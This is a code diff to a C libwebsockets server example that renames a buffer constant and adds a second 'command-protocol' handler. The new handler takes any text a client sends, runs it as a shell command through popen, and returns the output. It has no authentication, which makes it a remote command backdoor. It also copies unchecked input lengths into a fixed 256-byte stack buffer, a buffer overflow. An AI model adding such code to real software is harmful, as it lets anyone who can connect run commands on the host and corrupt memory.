@@ -3,8 +3,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-#define EXAMPLE_RX_BUFFER_BYTES (256)
-
+#define BUFFER_BYTES (256)
 
 static int callback_websockets(struct lws *wsi, enum lws_callback_reasons reason, void *user, void *in, size_t len)
 {
@@ -12,7 +11,6 @@ static int callback_websockets(struct lws *wsi, enum lws_callback_reasons reason
     {
     case LWS_CALLBACK_RECEIVE:
     {
-
         printf("Received data: %.*s\n", (int)len, (char *)in);
 
         const char *response = "message received";
@@ -46,12 +44,62 @@ static int callback_websockets(struct lws *wsi, enum lws_callback_reasons reason
     return 0;
 }
 
+static int callback_command_websockets(struct lws *wsi, enum lws_callback_reasons reason, void *user, void *in, size_t len)
+{
+    switch (reason)
+    {
+    case LWS_CALLBACK_RECEIVE:
+    {
+        char command[BUFFER_BYTES];
+        strncpy(command, (char *)in, len);
+        command[len] = '\0';
+
+        printf("Received command: %s\n", command);
+
+        FILE *fp;
+        char output[BUFFER_BYTES];
+        fp = popen(command, "r");
+        if (fp == NULL) {
+            fprintf(stderr, "Failed to execute command\n");
+            return 1;
+        }
+
+        fgets(output, sizeof(output), fp);
+
+        pclose(fp);
+
+        printf("Sending response: %s\n", output);
+        lws_write(wsi, (unsigned char *)output, strlen(output), LWS_WRITE_TEXT);
+
+        break;
+    }
+
+    case LWS_CALLBACK_ESTABLISHED:
+        printf("Command connection established\n");
+        break;
+
+    case LWS_CALLBACK_CLOSED:
+        printf("Command connection closed\n");
+        break;
+
+    default:
+        break;
+    }
+    return 0;
+}
+
 static struct lws_protocols protocols[] = {
     {
         "test-protocol",
         callback_websockets,
         0,
-        EXAMPLE_RX_BUFFER_BYTES,
+        BUFFER_BYTES,
+    },
+    {
+        "command-protocol",
+        callback_command_websockets,
+        0,
+        BUFFER_BYTES,
     },
     {NULL, NULL, 0, 0}
 };
@@ -79,6 +127,5 @@ int main(int argc, char *argv[])
     }
 
     lws_context_destroy(context);
-
     return 0;
 }
